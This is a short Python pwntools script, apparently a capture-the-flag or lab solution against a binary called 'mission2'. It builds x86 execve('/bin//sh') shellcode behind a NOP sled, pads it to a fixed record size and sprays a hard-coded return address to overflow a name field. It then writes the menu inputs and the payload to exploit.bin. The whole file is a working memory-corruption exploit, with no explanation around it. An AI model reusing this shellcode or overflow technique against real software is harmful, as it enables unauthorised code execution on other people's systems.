
from pwn import *

#--------------------------------------------------------
# Exploit Creation
#--------------------------------------------------------

shell = "nop\n" * 32

shell += """
xor eax, eax    # Setup the eax to call the sys_execve
push eax
push 0x68732f6e
push 0x69622f2f
inc eax         # 1
inc eax         # 2
inc eax         # 3
inc eax         # 4
inc eax         # 5
inc eax         # 6
inc eax         # 7
inc eax         # 8
inc eax         # 9
inc eax         # a
inc eax         # b
xor ecx, ecx    # set the param to NULL
xor edx, edx    # set the enviornm to NULL
mov ebx, esp
int 0x80
"""

shellcode = asm(shell)

print("[Shellcode] size %d"%len(shellcode))

record_size = 0x17c

first_record_addr = 0x804d468 # 0xffffca03

ret_spray = ""

for _ in range(4):
    ret_spray += p32(first_record_addr)

filler = "A" * (record_size - len(shellcode) - len(ret_spray))

exploit = shellcode + filler + ret_spray

#---------------------------------------------------------
# Get to name insertion
#---------------------------------------------------------

def get_guess():
    p = process("guesser")
    return p.recvline()



#p = process("../mission2")

#gdb.attach(p, '''
#set follow-fork-mode child
#break *0x080489f4
#''')

#print("[Start]")

#p.recvuntil("Exit")

f = open("exploit.bin", "wb")

f.write("1\n")

#print("[Play]")

#p.recvuntil("<")

f.write(get_guess())

#print("[Guessed]")

#p.recvuntil("White")

f.write("4\n")

#print("[Name insertion!]")

#p.recvuntil("name?")

#print("[Sending the exploit]")

f.write(exploit)

f.close()
#p.interactive()

